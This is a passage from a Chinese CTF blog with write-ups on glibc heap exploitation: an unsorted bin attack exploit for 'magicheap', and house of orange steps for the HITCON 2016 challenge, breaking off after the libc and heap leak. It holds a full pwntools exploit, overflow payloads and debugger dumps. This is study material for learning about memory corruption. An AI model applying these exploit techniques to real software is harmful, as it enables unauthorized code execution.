<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>存在后门函数，只要修改magic的大小&gt;0x1305即可，故使用unsortedbin</li>
<li>edit的size自己输入，存在堆溢出，故可以修改bk指针。</li>
</ol>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li><p>申请三个块</p>
<p>chunk1是为了堆溢出修改第二个块的bk</p>
<p>chunk2主要进行unsortbin attack</p>
<p>chunk3防止和top chunk合并</p>
</li>
<li><p>释放chunk2</p>
<p>chunk申请大小0x100，大于fastbin大小，从而进入unsortbin链</p>
</li>
<li><p>堆溢出chunk1，修改chunk2的bk指针</p>
<p>修改位magic-0x10的位置</p>
</li>
<li><p>重新申请0x100的大小，从而将chunk2从unsortbin中取出，从而向bk指向的地址写入&amp;main_arena+0x88</p>
</li>
<li><p>进入后门函数</p>
</li>
</ol>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"magicheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap :"</span>)</span><br><span class="line">    p.sendline(str(size)) </span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">    p.sendline(content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x006020A0</span> - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">0x1305</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="magicheap">附件</a></p>
<h2 id="2016-0CTF-zerostorage"><a href="#2016-0CTF-zerostorage" class="headerlink" title="2016_0CTF_zerostorage"></a>2016_0CTF_zerostorage</h2>
	
	</div>
  <a type="button" href="/2021/05/13/unsortedbin-attack/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/house-of-orange/" >house of orange</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><ol>
<li><p>程序中没有free函数</p>
</li>
<li><p>程序存在堆溢出，可以修改top chunk</p>
</li>
<li><p>使用libc版本：2.23-2.24</p>
<p>2.27不适用原因：取消了abort刷新流的操作</p>
</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><ol>
<li>堆溢出修改top chunk</li>
<li>申请比top chunk size大的chunk =&gt; top chunk放到unsorted bin中</li>
<li>利用unsorted bin attack结合FSOP（修改IO_list_all劫持到伪造的IO_FILE结构上） =&gt; getshell。</li>
</ol>
<h3 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h3><blockquote>
<p>待更新</p>
</blockquote>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="free-topchunk"><a href="#free-topchunk" class="headerlink" title="free topchunk"></a>free topchunk</h3><p>申请size&gt;top chunk，调用sysmalloc分配，分为两种情况：</p>
<ol>
<li>size&gt;=mp_.mmap_threshold（0x20000），mmap分配</li>
<li>否则，释放原来的topchunk，并申请一个新的topchunk</li>
</ol>
<h4 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h4><blockquote>
<p>具体看参考的，这里只记录方法</p>
</blockquote>
<ol>
<li>top chunk的size：0x20af1 =&gt;修改为0xaf1，即只保留后三位</li>
<li>申请0x1000大小即可</li>
</ol>
<h3 id="largebin链"><a href="#largebin链" class="headerlink" title="largebin链"></a>largebin链</h3><p>解链<code>unsorted bin</code>的时候，会先把<code>unsorted bin chunk</code>放在<code>large bin</code>中，就会在<code>fd_nextsize</code>和<code>bk_nextsize</code>上留下堆地址</p>
<h3 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h3><ol>
<li>利用unosortedbin attack修改<code>_IO_list_all</code>，即修改bk为<code>_IO_list_all-0x10</code><ul>
<li>如果<code>main_arena + 88</code>作为文件流地址，那么它的<code>chain</code>指针对应的是<code>smallbin[0x60]</code>。</li>
</ul>
</li>
<li>伪造fake IOFILE，大小为0x60，放入small bin中</li>
</ol>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><blockquote>
<p>house of orange经典题目</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>build：创建。一共创建三个chunk</p>
<p>第一个chunk：0x10大小，存放house指针和orange指针</p>
<p>第二个chunk：指定size创建chunk，填入content</p>
<p>第三个chunk：0x8大小，存放price和color</p>
</li>
<li><p>see：打印chunk内容</p>
</li>
<li><p>upgrade：重新指定size，修改chunk内容。故存在堆溢出</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>程序没有free函数，且存在堆溢出，故使用house of orange技术。</p>
</blockquote>
<ol>
<li>因为程序中没有free函数且存在堆溢出，故修改top chunk内容，再malloc一个大chunk，从而获得一个unsortedbin。</li>
<li>接着分割unsortedbin，得到largebin，从而泄露libc_base和heap_base</li>
<li>将old top chunk大小修改为0x60，并伪造io file。</li>
<li>利用unsortedbin attack修改<code>_IO_list_all</code>，使得0x60的chunk对应<code>_IO_list_all</code>的<code>_chain</code></li>
<li>再次malloc，由于unsortedbin attack后，unsortedbin链异常，故会触发malloc异常，刷新流，找到伪造的io file</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file houseoforange_hitcon_2016 </span><br><span class="line">houseoforange_hitcon_2016: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;a58bda41b65d38949498561b0f2b976ce5c0c301, stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;houseoforange_hitcon_2016&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h4 id="1-分配一个块"><a href="#1-分配一个块" class="headerlink" title="1.分配一个块"></a>1.分配一个块</h4><blockquote>
<p>用来溢出修改top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555555a2000</span><br><span class="line">0x5555555a2000:	0x0000000000000000	0x0000000000000021#存放house和orange指针的chunk</span><br><span class="line">0x5555555a2010:	0x00005555555a2050	0x00005555555a2030</span><br><span class="line">0x5555555a2020:	0x0000000000000000	0x0000000000000021#存放house内容的chunk，可以溢出</span><br><span class="line">0x5555555a2030:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0x5555555a2040:	0x0000000000000000	0x0000000000000021#存放price和color的chunk</span><br><span class="line">0x5555555a2050:	0x0000001f00000001	0x0000000000000000</span><br><span class="line">0x5555555a2060:	0x0000000000000000	0x0000000000020fa1#top chunk，保留0xfa1即可</span><br><span class="line">0x5555555a2070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="2-溢出，修改top-chunk"><a href="#2-溢出，修改top-chunk" class="headerlink" title="2.溢出，修改top chunk"></a>2.溢出，修改top chunk</h4><blockquote>
<p>通过edit的堆溢出，修改top chunk为0xfa1</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341060</span><br><span class="line">Size: 0xfa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x555556341000</span><br><span class="line">0x555556341000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341010:	0x0000555556341050	0x0000555556341030</span><br><span class="line">0x555556341020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555556341040:	0x6161616161616161	0x0000000000000021</span><br><span class="line">0x555556341050:	0x0000ddaa00000001	0x0000000000000000</span><br><span class="line">0x555556341060:	0x0000000000000000	0x0000000000000fa1</span><br><span class="line">0x555556341070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556341080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-申请大块，释放top-chunk"><a href="#3-申请大块，释放top-chunk" class="headerlink" title="3.申请大块，释放top chunk"></a>3.申请大块，释放top chunk</h4><blockquote>
<p>申请一个大于0xfa1的chunk，如0x1000，old top chunk会被放入unsortedbin中，并会申请一个新的top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5555574930a0</span><br><span class="line">Size: 0xf41</span><br><span class="line">fd: 0x7fcd0ff56b78</span><br><span class="line">bk: 0x7fcd0ff56b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557493fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557494000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555574930a0 —▸ 0x7fcd0ff56b78 (main_arena+88) ◂— 0x5555574930a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<h4 id="4-切割old-topchunk为large-chunk"><a href="#4-切割old-topchunk为large-chunk" class="headerlink" title="4.切割old topchunk为large chunk"></a>4.切割old topchunk为large chunk</h4><blockquote>
<p>large chunk中留有libc_base和heap_base，可以show出来</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564940a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE#申请来的chunk</span><br><span class="line">Addr: 0x5555564940c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564944d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE#top chunk</span><br><span class="line">Addr: 0x5555564944f0</span><br><span class="line">Size: 0xaf1</span><br><span class="line">fd: 0x7fe4acc50b78</span><br><span class="line">bk: 0x7fe4acc50b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556494fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556495000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555564940c0</span><br><span class="line">0x5555564940c0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555564940d0:	0x00007fe4acc51161	0x00007fe4acc51188</span><br><span class="line">0x5555564940e0:	0x00005555564940c0	0x00005555564940c0</span><br><span class="line">0x5555564940f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556494100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555556494000     0x5555564d7000 rw-p    43000 0      [heap]</span><br><span class="line">    0x7fe4ac8b5000     0x7fe4aca4d000 r-xp   198000 0      &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4aca4d000     0x7fe4acc4c000 ---p   1ff000 198000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc4c000     0x7fe4acc50000 r--p     4000 197000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc50000     0x7fe4acc52000 rw-p     2000 19b000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure>

<h4 id="泄漏libc-base和heap-base"><a href="#泄漏libc-base和heap-base" class="headerlink" title="泄漏libc_base和heap_base"></a>泄漏libc_base和heap_base</h4><blockquote>
<p>这里，name的时候要用send，sendline的话，会导致这里有问题，，，，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show()</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x271 bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 d9 d1  6e 7f 0a 50  72 69 63 65  20 6f 66 20  │aa··│n··P│rice│ of │</span><br><span class="line">[...]</span><br><span class="line">[+] libc_base:0x7f6ed19fa000</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br></pre></td></tr></table></figure>

